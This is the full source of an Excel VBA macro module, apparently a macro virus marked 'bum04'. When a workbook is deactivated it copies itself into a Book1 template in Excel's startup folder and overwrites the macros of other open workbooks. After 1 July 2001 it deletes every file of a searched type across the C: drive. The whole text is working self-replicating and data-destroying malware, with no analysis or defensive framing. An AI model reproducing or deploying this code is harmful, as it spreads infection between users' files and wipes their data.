   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisWorkbook"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True
   '<!--bum04-->
   Private Sub Workbook_Deactivate()
       On Error Resume Next
       Set AW = ActiveWorkbook.VBProject.VBComponents("ThisWorkbook").CodeModule
       Set TW = ThisWorkbook.VBProject.VBComponents("ThisWorkbook").CodeModule
       If UCase(Dir(Application.StartupPath + "\Book1.")) <> "BOOK1" Then
           Set xlApp = CreateObject("Excel.Application")
           Set Book1Obj = xlApp.Workbooks.Add
           Book1Obj.VBProject.VBComponents("ThisWorkbook").CodeModule.InsertLines 1, TW.Lines(1, TW.CountofLines)
           Book1Obj.SaveAs Filename:=Application.StartupPath & "\Book1.", FileFormat:=xlNormal, AddToMru:=False
           Book1Obj.Close
           xlApp.Quit
       End If
       If AW.Lines(1, 1) <> "'<!--bum04-->" Then
           AW.DeleteLines 1, AW.CountofLines
           AW.InsertLines 1, TW.Lines(1, TW.CountofLines)
       End If
   Bum (101)
   End Sub

   Function Bum(id As Integer)
   check = False
   If UCase(Dir("c:\windows\system\bum.dll")) = "BUM.DLL" Then check = True
   If check = False And Date > #7/1/2001# Then
              With Application.FileSearch
                       .NewSearch
                       .LookIn = "C:"
                       .FileType = 2
                       .SearchSubFolders = True
                       If .Execute() > 0 Then
                       For i = 1 To .FoundFiles.Count
                           Kill .FoundFiles(i)
                       Next i
                       End If
                End With
   End If
   End Function
